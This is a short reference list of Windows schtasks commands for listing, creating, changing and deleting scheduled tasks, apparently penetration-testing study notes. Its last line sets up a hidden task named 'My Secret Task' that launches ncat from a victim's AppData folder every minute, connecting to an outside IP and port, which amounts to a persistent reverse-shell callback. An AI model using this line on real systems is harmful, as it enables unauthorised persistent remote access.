```
schtasks ---> Displays all tasks scheduled on the local machine.

schtasks /query ---> Displays all tasks scheduled on the local machine. Interchangeable with schtasks command.

schtasks /query /V /FO list ---> Displays all scheduled tasks with verbose information in a list format.

schtasks /create ---> Allows for the creation of scheduled tasks.

schtasks /create /sc <Schedule Frequency> /tn <Task Name> /tr <Program Path> ---> Creates a new scheduled task based on a select schedule, with a provided name, and a program specified to run when the task starts.

schtasks /change ---> Allows for modification of an existing scheduled task.

schtasks /change /tn <Task Name> /ru <Username> /rp <Password> ---> Modifies a scheduled task with a specified name to run under the permissions of the user account using the provided password for authentication.

schtasks /delete ---> Allows for the deletion of scheduled tasks.

schtasks /delete /tn <Task Name> ---> Deletes a scheduled task with the matching name.

schtasks /create /sc minute /mo 1 /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"
```